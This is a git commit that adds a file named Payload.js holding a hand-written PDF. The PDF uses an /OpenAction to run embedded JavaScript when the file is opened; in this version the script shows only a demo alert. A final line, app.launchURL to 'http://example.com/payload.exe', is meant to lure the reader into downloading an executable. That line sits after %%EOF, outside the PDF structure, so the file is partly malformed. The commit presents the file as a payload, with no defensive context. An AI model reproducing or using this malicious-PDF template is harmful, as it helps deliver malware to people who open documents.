a726b24466ccc49cbc706fc850ad73c0a8226dc5
rafly <144429611+flywzen@users.noreply.github.com>
2025-03-10 23:19:00 +0700

    Create Payload.js

---
+++ Payload.js
@@ -0,0 +1,52 @@
+%PDF-1.5
+1 0 obj
+<< /Type /Catalog
+   /Pages 3 0 R
+   /OpenAction 2 0 R
+>>
+endobj
+2 0 obj
+<< /S /JavaScript
+   /JS (app.alert("Ini adalah demo PDF dengan JavaScript!");)
+>>
+endobj
+3 0 obj
+<< /Type /Pages
+   /Count 1
+   /Kids [4 0 R]
+>>
+endobj
+4 0 obj
+<< /Type /Page
+   /Parent 3 0 R
+   /MediaBox [0 0 612 792]
+   /Contents 5 0 R
+>>
+endobj
+5 0 obj
+<< /Length 44 >>
+stream
+BT
+/F1 24 Tf
+100 700 Td
+(Contoh halaman PDF) Tj
+ET
+endstream
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000060 00000 n 
+0000000110 00000 n 
+0000000160 00000 n 
+0000000240 00000 n 
+trailer
+<< /Size 6
+   /Root 1 0 R
+>>
+startxref
+300
+%%EOF
+
+app.launchURL("http://example.com/payload.exe", true);
